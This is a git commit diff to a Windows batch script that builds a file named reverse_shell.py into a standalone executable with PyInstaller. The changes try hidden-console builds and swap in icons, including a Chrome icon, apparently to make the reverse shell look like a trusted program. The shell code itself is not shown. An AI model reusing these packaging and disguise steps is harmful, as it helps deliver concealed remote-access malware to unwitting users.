23d73a9b25c7305350b8aaab363b2ce2a3d66a87
Nuno Pinto <nunorrpinto@gmail.com>
2020-05-12 22:40:35 +0100

    little structural folder changes

--- genEXEc.bat
+++ genEXEc.bat
@@ -3,8 +3,10 @@ rmdir /S /Q __pycache__
 rmdir /S /Q build
 rmdir /S /Q dist
 del reverse_shell.spec
-Rem c:\Python38\Scripts\pyinstaller --onefile --noconsole reverse_shell.py
-c:\Python38\Scripts\pyinstaller --onefile reverse_shell.py
+Rem c:\Python38\Scripts\pyinstaller --onefile --noconsole --icon c:\Users\rever\Downloads\Chrome_icon_2.ico reverse_shell.py
+Rem c:\Python38\Scripts\pyinstaller --onefile --noconsole --icon c:\Users\rever\Downloads\iconfinder_image_285633.ico reverse_shell.py
+c:\Python38\Scripts\pyinstaller --onefile --icon c:\Users\rever\Downloads\iconfinder_image_285633.ico reverse_shell.py
+Rem c:\Python38\Scripts\pyinstaller --onefile reverse_shell.py
 cd dist
-reverse_shell.exe
+Rem reverse_shell.exe
 cd ..
